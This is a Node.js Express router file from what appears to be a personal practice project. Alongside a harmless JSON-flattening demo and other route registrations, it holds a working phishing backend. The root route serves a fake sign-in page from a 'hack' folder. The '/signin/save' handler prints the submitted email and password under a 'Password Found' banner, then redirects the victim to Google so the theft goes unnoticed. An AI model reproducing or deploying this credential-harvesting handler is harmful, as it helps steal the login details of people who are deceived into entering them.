"use strict";

const express = require('express');
const router = express.Router();
const SingleList = require('./single-linked-list');
const Sorting = require('./sorting');
const Learning = require('./custom-learning');
const flatten = require('flat');
/* GET home page. */
router.get('/', function (req, res, next) {

  res.sendFile(__dirname + '/hack/signin.htm');
});

router.post('/signin/save', function (req, res, next) {

  console.log("=======Password Found=========")
  console.log(req.body.hidEmail);
  console.log(req.body.Passwd);
  res.redirect('https://www.google.co.in');
});

router.get('/flatten', function (req, res, next) {
  let data = [{

    "WA": 100,
    "type": 500,
    array1: [
      {
        "name": "Idayathullah",
        "number": 1,
        "arrayAgain": [
          {
            "test": 1,
            "again": 1
          },
          {
            "test": 2,
            "again": 2
          }, {
            "test": 3,
            "again": 3
          }]
      },
      {
        "name": "Sundar",
        "number": 2,
        "arrayAgain": [{
          "test": 4,
          "again": 4
        }, {
          "test": 5,
          "again": 5
        },
          {
            "name": "Karthik",
            "number": 3,
            "arrayAgain": [{
              "test": 6,
              "again": 6
            }, {
              "test": 7,
              "again": 7
            }]
          }
        ],
        array2: [
          {
            "text": "blue"
          },
          {
            "text": "red"
          },
          {
            "text": "green"
          }
        ]
      }]
  }], logs = flatten(data);
  res.status(200).send(logs);
});


SingleList.addRoutes(router);
Sorting.addRoutes(router);
Learning.addRoutes(router);
module.exports = router;
